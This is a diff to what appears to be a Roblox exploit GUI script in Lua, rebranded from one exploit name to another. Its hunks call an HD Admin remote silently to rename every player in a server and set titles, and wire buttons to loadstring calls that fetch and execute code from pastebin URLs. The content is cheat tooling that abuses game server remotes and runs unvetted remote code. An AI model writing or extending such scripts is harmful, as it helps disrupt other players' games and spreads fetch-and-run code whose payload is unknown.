@@ -2833,7 +2833,7 @@ local function C_25()
 		"\nJobId: "..game.JobId..	
 		"\nPlaceName: "..placeName..	
 		"\nTime: "..time..	
-		"\nyou this is my old gui (ZachXploit) but i changed it to H4rkz Gui"	
+		"\nyou this gui was made by @thechoosenone , this gui for f3x game!"	
 	
 		task.wait(1)	
 	end	
@@ -3153,7 +3153,7 @@ local function C_53()
 		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient")	
 		local RequestCommand = hd.Signals.RequestCommandSilent	
 	
-		RequestCommand:InvokeServer(";name all ZachXploitz")	
+		RequestCommand:InvokeServer(";name all H4rKzZ")	
 	end)	
 end;
 task.spawn(C_53);
@@ -3250,7 +3250,7 @@ local function C_6b()
 		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient")	
 		local RequestCommand = hd.Signals.RequestCommandSilent	
 	
-		RequestCommand:InvokeServer(";titledb me  H4RKZCOOL")	
+		RequestCommand:InvokeServer(";titlebk me  H4RKZCOOL")	
 	end)	
 end;
 task.spawn(C_6b);
@@ -3865,7 +3865,7 @@ local function C_b7()
 	local Button = script.Parent	
 	
 	Button.MouseButton1Click:Connect(function()	
-	loadstring(Game:HttpGet("https://pastebin.com/raw/7t1TS2z1"))()	
+	loadstring(game:HttpGet("https://pastebin.com/raw/7t1TS2z1"))()	
 	end)	
 end;
 task.spawn(C_b7);
@@ -4191,7 +4191,7 @@ local function C_cc()
 	local Button = script.Parent	
 	
 	Button.MouseButton1Click:Connect(function()	
-	loadstring(Game:HttpGet("https://pastebin.com/raw/aFpDBYP5"))()	
+	loadstring(game:HttpGet("https://pastebin.com/raw/aFpDBYP5"))()	
 	end)	
 end;
 task.spawn(C_cc);
